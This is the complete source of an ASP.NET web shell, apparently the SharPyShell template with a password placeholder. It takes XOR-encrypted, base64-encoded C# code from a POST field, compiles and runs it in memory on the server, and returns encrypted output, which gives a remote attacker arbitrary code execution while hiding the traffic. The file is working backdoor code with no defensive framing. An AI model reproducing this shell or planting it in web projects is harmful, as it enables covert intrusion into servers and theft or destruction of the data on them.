<%@ Import Namespace="System" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Reflection" %>
<%@ Import Namespace="Microsoft.CSharp" %>
<%@ Import Namespace="System.CodeDom.Compiler" %>

<script Language="c#" runat="server">

byte[] Xor_Enc_Dec(byte[] input, string password) {
	byte[] key = Encoding.UTF8.GetBytes(password);
	byte[] output = new byte[input.Length];
	for(int i = 0; i < input.Length; i++) {
		output[i] = (byte) (input[i] ^ key[i % key.Length]);
	}
	return output;
}

void Page_Load(object sender, EventArgs e)
{
	string password = "{{SharPyShell_Placeholder_pwd}}";
	if(Request.Form["data"]!=null){
		byte[] decoded_request_byte=Convert.FromBase64String(Request.Form["data"]);
		byte[] runtime_code_byte=Xor_Enc_Dec(decoded_request_byte, password);
		string runtime_code=Encoding.UTF8.GetString(runtime_code_byte);
		object runtime_exec_output = new object();
		CompilerResults results = null;
		try{
			CSharpCodeProvider provider = new CSharpCodeProvider();
			CompilerParameters compilerParams = new CompilerParameters();
			compilerParams.GenerateInMemory = true;
			compilerParams.GenerateExecutable = false;
			compilerParams.ReferencedAssemblies.Add("System.dll");	
			results = provider.CompileAssemblyFromSource(compilerParams, runtime_code);
			object o = results.CompiledAssembly.CreateInstance("SharPyShell");
			MethodInfo mi = o.GetType().GetMethod("ExecRuntime");
			runtime_exec_output = mi.Invoke(o, null);
		}
		catch(Exception exc){
			string exc_out_str = exc.ToString()+"\n\n{{{SharPyShellError}}}";
			for( int i=0; i<results.Errors.Count; i++ )                
				exc_out_str +=  i.ToString() + ": " + results.Errors[i].ToString();
			runtime_exec_output=Encoding.UTF8.GetBytes(exc_out_str);
			Response.Clear();
		}
		byte[] output_runtime_code_enc=Xor_Enc_Dec((byte[])(runtime_exec_output), password);
		string output_runtime_code_enc_b64=Convert.ToBase64String(output_runtime_code_enc);
		Response.Write(output_runtime_code_enc_b64);
	}
}

</script>

